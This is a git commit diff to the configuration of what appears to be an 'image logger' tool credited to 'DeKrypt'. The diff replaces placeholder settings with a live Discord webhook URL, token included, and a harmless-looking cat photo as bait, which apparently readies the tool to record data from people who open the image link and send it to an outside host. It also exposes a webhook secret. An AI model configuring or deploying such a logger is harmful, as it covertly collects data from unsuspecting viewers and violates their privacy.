b296bd8d606ce99bb64eee595ef8593269237b32
loveccour1 <glazardamian9@gmail.com>
2025-02-11 23:52:11 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1339004647305642074/nOItU7SVtHDPBwvQEz5ncRmlu_AOI7FLuwjwecHdkfzxjR_LkchVG3JHIZfCDb37CXd2",
+    "image": "https://upload.wikimedia.org/wikipedia/commons/3/3a/Cat03.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
